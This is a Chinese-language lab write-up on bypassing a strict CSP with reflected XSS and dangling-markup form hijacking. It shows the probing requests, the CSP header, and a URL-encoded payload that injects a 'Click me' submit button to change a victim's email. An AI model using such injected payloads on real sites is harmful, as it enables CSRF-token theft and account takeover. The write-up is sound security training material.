# 实验：受严格 CSP 保护的反射型 XSS 与悬垂标记（dangling markup）攻击

本实验使用了严格的 CSP（内容安全策略），阻止浏览器从外部域加载子资源。

为了解决本实验，请执行一个表单劫持（form hijacking）攻击以绕过 CSP，窃取模拟受害者用户的 CSRF Token，并使用该 Token 授权将电子邮件地址更改为 `hacker@evil-user.net`。

你必须用单词 "Click" 来标记你的向量，以便诱导模拟用户点击它。例如：

```html
<a href="">Click me</a>
```

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用提供的漏洞利用服务器（exploit server）。

> **提示**
> 你无法注册已被其他用户使用的电子邮件地址。如果在测试利用程序时更改了自己的电子邮件地址，请确保在向受害者交付最终利用程序时使用另一个不同的电子邮件地址。

## 步骤

探测
- 查看修改邮件功能，
    ```http
    GET /my-account?id=wiener HTTP/2
    ```

    - 响应
        ```http
        Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
        X-Frame-Options: SAMEORIGIN
        ```
        - `script-src 'self'` 仅允许同源 JS 脚本文件，禁止脚本标签与事件监听器
        - `img-src 'self'` 无法使用图片元素带外
        - 如描述，此处需用户交互

        ```html
        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
            <label>Email</label>
            <input required type="email" name="email" value="">
            <input required type="hidden" name="csrf" value="QvN4kkhhN97ICJV7vihKjUCIgCXbP0Xh">
            <button class='button' type='submit'> Update email </button>
        </form>
        ```

- 尝试设置额外参数 `email=foooo` 以注入表单中的 input 元素

    ```http
    GET /my-account?id=wiener&email=foooo HTTP/2
    ```

    - 响应

        ```html
        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
            <label>Email</label>
            <input required type="email" name="email" value="foooo">
            <input required type="hidden" name="csrf" value="QvN4kkhhN97ICJV7vihKjUCIgCXbP0Xh">
            <button class='button' type='submit'> Update email </button>
        </form>
        ```
        - XSS 上下文为 input 的 value 属性值字符串内
        - csrf 令牌之后使用独特的单引号

测试
- `">` 未被转义/编码，成功逃逸出标签
- 删除账户端点的 id 名值对后仍可访问（目标用户名称未知，此处无需名称则消除障碍）

构造载荷
- 虽然可设置 a 标签的 href 悬空，然而无法设置文本段 
- 尝试使用当前修改邮件功能的表单元素上下文，设置目标邮件账户
    ```html
    /my-account?email=<@urlencode>hacker@evil-user.net"><button class='button' type='submit'>Click me</button><label name="foo</@urlencode>
    ```
    - 移除 URL 的 id 名值对
    - 设置目标邮件账户 `hacker@evil-user.net`
    - 设置新按钮 `Click me`

    - 虽然可修改当前登录账户的邮件，但发送到受害者后并未通过挑战。
        - 此时攻击者账户占用了不可重复的目标邮件，在修改本账户邮件后通过挑战
